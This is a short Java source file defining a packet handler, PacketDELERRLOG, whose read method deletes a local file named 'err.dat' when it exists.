package com.redpois0n.packets;

import java.io.File;

public class PacketDELERRLOG extends Packet {

	@Override
	public void read(String line) throws Exception {
		File errlog = new File("err.dat");
		if (errlog.exists()) {
			errlog.delete();
		}
	}

}
